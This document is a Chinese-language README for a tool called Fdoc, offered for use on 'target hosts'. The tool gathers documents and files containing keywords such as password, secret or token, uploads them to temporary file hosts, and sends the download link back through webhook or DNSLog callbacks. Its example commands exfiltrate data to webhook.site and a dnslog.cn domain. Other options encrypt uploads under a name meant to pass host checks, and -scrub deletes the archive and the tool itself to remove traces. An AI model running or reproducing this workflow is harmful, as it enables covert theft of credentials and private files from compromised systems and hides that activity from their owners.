# Fdoc

在目标主机上按条件筛选文件，打包成 `.tgz`（tar.gz）。

可选 `-upload`：内嵌 uploader，按压缩包大小自动选临时网盘上传。不配 `-webhook`/`-dns` 时，下载链接打印到本地；配了则可回传到你的接收端（C2 掉线也能拿回链接）。不加 `-upload` 时只本地打包，不联网。

提供 Linux / Windows / macOS 静态二进制。

> 英文文档：[README.md](README.md)

## 功能

- 按后缀 / 文件名 / 内容关键字 / 修改日期筛选
- 多个条件之间是 **且**；同一参数内逗号分隔是 **或**
- 默认 `-e documents`（不会扫全盘所有文件）
- `-max` 限制打包总大小（默认 1GB），超限保留已打部分（退出码 2）
- `-max-file` 跳过过大单文件（默认 100MB，`0` 关闭）
- 默认跳过系统垃圾目录，可用 `-x` 覆盖
- 边扫边打，不占大内存
- `-size` 只统计大小，不打包
- `-upload` 自动上传；可加 `-webhook` / `-dns` 回传
- `-scrub` 成功后删除压缩包和自身
- `-encrypt` 上传前加密（需同时 `-upload -key`）

> 符号链接会跳过，避免循环和权限问题。

## 快速开始

```shell
# 打包某个目录下的文档
Fdoc -d /data -o out.tgz

# 只看会打出多大
Fdoc -d /data -size

# 打包并上传，链接打到屏幕上
Fdoc -d /data -o out.tgz -upload -q

# 上传后回传到 webhook，并清理痕迹
Fdoc -d /data -o out.tgz -upload -webhook https://host/hook -scrub
```

更完整说明见 `Fdoc -h` 与下文。

## 常用参数

| 参数 | 说明 |
|------|------|
| `-d` | 扫描目录（默认用户家目录） |
| `-o` | 输出路径（默认 `output_<时间>.tgz`） |
| `-e` | 后缀：`documents`（默认）/ `all` / `any` / `pdf,txt,...` |
| `-f` | 文件名包含（逗号=或） |
| `-k` | 文件内容包含（逗号=或；跳过二进制，单文件最多扫 8MB） |
| `-t` | 只收该日期及以后修改的文件（`YYYY-MM-DD`） |
| `-max` | 匹配文件累计逻辑大小上限（默认 1GB） |
| `-max-file` | 单文件上限（默认 100MB，`0`=不限制） |
| `-x` | 跳过目录（逗号分隔；设置后覆盖默认跳过列表） |
| `-size` | 只统计，不打包 |
| `-q` / `-v` | 安静 / 详细 |
| `-upload` | 打包后上传 |
| `-b` | 指定上传渠道（默认按大小自动选） |
| `-webhook` | HTTPS 回传地址（可选） |
| `-dns` | DNSLog 域名（可选，webhook 失败时备用） |
| `-encrypt` / `-key` | 上传前加密 |
| `-scrub` | 成功后删压缩包和程序自身 |

退出码：`0` 成功，`1` 错误，`2` 触达 `-max`（部分包已保留；若开了 `-upload` 仍可能上传）。

## 筛选规则

| 写法 | 含义 |
|------|------|
| `-e pdf -f secret` | 后缀 pdf **且** 文件名含 secret |
| `-k password:,token:` | 内容含 password: **或** token: |
| `-e any` | 不限后缀（仍可与 `-f`/`-k`/`-t` 组合） |
| `-e all` | 常见文档+压缩包+txt，**不是**全盘所有文件 |

### 后缀预设

| 预设 | 包含 |
|------|------|
| `documents`（默认） | pdf/doc/xls/ppt/csv |
| `all` | 常见文档 + 压缩包 + txt |
| `archives` / `packages` | zip/rar/7z/tar/gz |
| `images` | jpg/png/gif/bmp |
| `videos` | mp4/mkv/avi/mov |
| `any` | 不限制后缀 |

### 大小相关

| 参数 | 含义 |
|------|------|
| `-size` | 报告磁盘占用 + 逻辑大小；会受 `-max` 影响提前停 |
| `-max` | 累计逻辑大小预算；超限保留部分包 |
| `-max-file` | 单文件过大则跳过，继续打别的 |

## 上传与回传

流程：打包 → 按体积自动选渠道上传 → **本地打印链接** 和/或 **远程回传** → 可选 `-scrub`。

- **不配** `-webhook` / `-dns`：stderr 打 `UPLOAD_OK ...`，stdout 打下载 URL（方便脚本接）
- **配了**：优先 webhook；失败或没配 webhook 再用 DNS。不是双发。

加密上传成功时 stderr 会看到 `ENCRYPT_OK plain=... cipher=... decrypt_first=1 ...`。下载文件虽可能叫 `*.tgz`，但**内容是密文**，必须以 `UP01` 开头，且**必须先 `Fdoc decrypt` 再解压**。

### 加密格式与解密

`-upload -encrypt -key SECRET` 使用与 uploader 相同的格式：

```text
[UP01 4字节魔数][随机 IV 16字节][AES-256-CBC 密文，PKCS7 填充]
```

- 密钥：把 `SECRET` 按 PKCS7 方式填充到 **32 字节**，作为 AES-256 密钥（不是 PBKDF2）
- 远端文件名仍用 `*.tgz`（`*.tar.gz` 会改成 `*.tgz`），方便过主机校验；**字节不是 gzip**，直接 `tar`/`gunzip` 会失败
- 可用 `xxd` 核对：文件头应为 `55 50 30 31`（`UP01`）；若是 `1f 8b` 则是明文 gzip，未加密
- `cipher` 大小应等于 `ENCRYPT_OK` 里的 `cipher=`
- **磁盘**：`-encrypt` 会在归档**同目录**写临时密文（不用 `/tmp`，避免 tmpfs），上传期间大约需要 **1× 归档大小** 的额外空间。`Fdoc decrypt` 会写出完整明文（再约 1×），解密过程流式进行，不会把十几 GB 整包塞进内存。`-q` 只静默人类日志；`UPLOAD_OK` / `ENCRYPT_OK` / `DECRYPT_OK` 等机器行仍会输出。

解密（**必做**；推荐 Fdoc 自带子命令，无需 uploader 二进制）：

```shell
Fdoc decrypt -key 'SECRET' -o recovered.tgz downloaded.tgz
# -o 省略时：xxx.gz → xxx.tgz；若输入已是 xxx.tgz → xxx.dec.tgz（避免覆盖）
# 已存在则加 -force
tar -tzf recovered.tgz
```

也可用：`uploader decrypt -k 'SECRET' -o recovered.tgz downloaded.tgz`。

### Webhook

示例：

- `https://webhook.site/<uuid>`（临时测试）
- `https://your-vps.example.com/fdoc/hook`（自建）

须用 `https://`（本机测试可用 `http://127.0.0.1/...`）。

POST JSON 示例：

```json
{
  "task_id": "op42",
  "host": "HOSTNAME",
  "url": "https://temp.sh/....",
  "backend": "temp",
  "archive": "x.tgz",
  "size": 1234567,
  "files": 42,
  "truncated": false,
  "ts": 1710000000
}
```

`archive` 只含文件名，不含绝对路径。

### DNS 回传

查询格式：

```text
<序号>-<总数>-<base32片段>.<task_id>.<你的dnslog域名>
```

解码内容：`task_id|主机名|下载URL`。

还原脚本：

```shell
python3 scripts/dnslog_decode.py          # 粘贴后 Ctrl-D
pbpaste | python3 scripts/dnslog_decode.py -q   # 只打印 URL
```

须凑齐同一 `task_id` 的全部分片；运行时也要求每个分片查询都发出去（NXDOMAIN 算成功，超时不算）。`-cb-timeout` 同时限制 webhook 与 DNS 总预算。

### `-scrub` 说明

上传成功后执行；若配置了回传，还需回传成功。  
**不保证**对方一定收到/存下链接。优先用 webhook；仅 DNS + `-scrub` 请谨慎。Windows 自删可能需要管理员权限（失败会打 `SCRUB_PARTIAL`）。

Unix 下 `-upload` 会忽略 `SIGHUP`，降低会话断开导致中途被杀的概率。

## 更多例子

```shell
# 先看大小再打包
Fdoc -d /data/docs -e documents -size
Fdoc -d /data/docs -e documents -max 500MB -o docs.tgz

# 家目录文档，安静模式
Fdoc -q -o docs.tgz

# 按文件名 / 内容找
Fdoc -d /data -f password,secret -e any -o hits.tgz
Fdoc -d /data -e txt,ini,conf -k token:,password: -o hits.tgz

# 只要某日期之后的
Fdoc -d /data -e documents -t 2024-01-01 -o recent.tgz

# 加密上传 + 回传 + 清理
Fdoc -d /data -e documents -o /tmp/x.tgz -upload \
  -encrypt -key 'secret' \
  -webhook https://webhook.site/<uuid> \
  -dns xxx.dnslog.cn \
  -task-id op42 -scrub -q

# 解密下载回来的密文
Fdoc decrypt -key 'secret' -o /tmp/recovered.tgz ~/Downloads/xxx.bin
```

## 编译

`uploader` 通过 `go.mod` 的 `replace uploader => ./third_party/uploader` 内嵌。同步说明见 [`third_party/README.md`](third_party/README.md)。

```shell
go mod tidy
CGO_ENABLED=0 go build -trimpath -ldflags='-s -w' -o Fdoc .

make setup build-linux build-windows build-osx

go test ./...
```

## 冒烟 / 回归

```shell
bash scripts/smoke_regress.sh           # 离线
ONLINE=1 bash scripts/smoke_regress.sh  # 含真实上传 + 本地 webhook
```

## 目录结构

```text
main.go              入口
option/              命令行参数
pkg/                 扫描 / 过滤 / 打包
pkg/compress/        tgz 写入
pkg/upload/          上传封装
pkg/callback/        webhook + DNS 回传
pkg/decrypt/         密文解密（Fdoc decrypt）
pkg/scrub/           痕迹清理
scripts/             DNS 解码、冒烟脚本
third_party/uploader 内嵌 uploader
logx/                日志
utils/               工具函数
```

## 许可证

MIT（见 LICENSE）。
